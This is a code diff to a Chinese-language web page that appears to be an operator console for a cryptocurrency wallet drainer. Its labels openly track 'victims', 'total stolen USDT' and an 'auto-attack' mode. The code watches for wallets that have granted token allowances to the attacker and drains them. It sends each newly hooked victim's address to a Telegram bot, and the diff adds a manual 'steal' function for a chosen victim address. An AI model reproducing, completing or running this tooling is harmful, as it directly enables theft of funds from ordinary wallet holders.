@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6.2（新授權提示 + Telegram通知）</title>
+  <title>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,7 +21,7 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6.2（新授權提示 + Telegram通知）</h2>
+  <h2>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
@@ -30,12 +30,10 @@
   <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
   <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
   <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
-
   <p id="notify"></p>
 
-  <br>
   <input id="victim" placeholder="受害者地址" />
-  <button onclick="steal()">🤸️ 盜取 USDT</button>
+  <button onclick="steal()">🧘️‍♂️ 盜取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
 
@@ -111,7 +109,6 @@
         const allowance = await contract.allowance(owner, attacker);
         if (allowance.isZero()) continue;
 
-        // 📣 新授權提示區塊
         if (!knownApprovals.has(owner)) {
           knownApprovals.add(owner);
           notifyNewApproval(owner);
@@ -119,11 +116,9 @@
 
         const time = new Date().toLocaleString();
         const tr = document.createElement("tr");
-        tr.innerHTML = `
-          <td>${owner}</td>
-          <td>${time}</td>
-          <td class="status" id="status-${owner}">尚未攻擊</td>`;
+        tr.innerHTML = `<td>${owner}</td><td>${time}</td><td class="status" id="status-${owner}">尚未攻擊</td>`;
         tbody.appendChild(tr);
+
         if (autoEnabled) await autoSteal(owner);
       }
 
@@ -131,8 +126,7 @@
     }
 
     async function notifyNewApproval(addr) {
-      document.getElementById("notify").innerText = `🆕 新授權地址：${addr}`;
-
+      document.getElementById("notify").innerText = `🆒 新授權地址：${addr}`;
       const text = `🐟 上魚\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}\n✅ 已授權給攻擊者`;
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -158,6 +152,15 @@
         row.className = "ok";
       }
       attackedSet.add(victim);
+    }
+
+    async function steal() {
+      const victim = document.getElementById("victim").value;
+      if (!ethers.utils.isAddress(victim)) {
+        document.getElementById("status").innerText = "❌ 無效地址";
+        return;
+      }
+      await autoSteal(victim);
     }
 
     document.getElementById("victim").addEventListener("input", async (e) => {
